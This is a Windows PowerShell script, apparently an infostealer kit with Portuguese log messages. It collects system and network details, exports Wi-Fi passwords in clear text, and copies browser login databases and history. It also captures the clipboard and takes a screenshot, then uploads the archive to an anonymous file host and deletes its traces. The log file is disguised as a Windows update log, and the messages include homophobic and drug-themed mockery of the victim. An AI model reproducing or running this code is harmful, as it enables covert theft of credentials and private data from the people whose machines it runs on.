# ---------- KIT v6.0 – “OFICIAL” ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$upUrl   = "https://api.anonfilesnew.com/upload"
$logFile = "$env:TEMP\windowsupdate.log"
$7z      = "$env:TEMP\7za.exe"

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

# 0) 7za
if (!(Test-Path $7z)) {
    Write-Log "[7Z] Baixando 7za.exe..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Write-Log "[START] Descobrindo se usuário é gay..."
New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Dados do sistema
Write-Log "[INFO] Confirmado, usuário é gay – coletando provas..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede
Write-Log "[INFO] Procurando cocaína nos arquivos de rede..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas
Write-Log "[INFO] Verificando se usuário usa pó..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    "Log Security não disponível" | Out-File "$kit\logons.txt" -Encoding UTF8
}

# 4) Navegadores
Write-Log "[INFO] Descobrindo histórico de acesso a sites suspeitos..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

# 5) Certificados
Write-Log "[INFO] Listando certificados falsos..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard
Write-Log "[INFO] Vasculhando clipboard em busca de drogas..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Recentes
Write-Log "[INFO] Descobrindo arquivos inúteis..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Screenshot
Write-Log "[INFO] Tirando fotos para o álbum..."
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

# 9) Compactação
Write-Log "[7Z] Empacotando evidências..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
& $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null
if (Test-Path $arc) {
    $size = (Get-Item $arc).Length
    Write-Log "[7Z] Pacote de $size bytes pronto para envio"
} else {
    Write-Log "[ERRO] Falha no empacotamento"
    exit 1
}

# 10) Upload – sem parâmetro problemático
Write-Log "[UP] Enviando para o chefe..."
try {
    $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
    $reply = cmd /c $curl
    Write-Log "[UP] Resposta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[OK] Evidências entregues – link: $($matches[1])"
    } else {
        Write-Log "[ERRO] Entrega falhou"
    }
} catch {
    Write-Log "[ERRO] Exceção no upload: $_"
}

# 11) Limpeza
Write-Log "[CLEAN] Apagando rastros..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "[END] Missão cumprida. Log em $logFile"
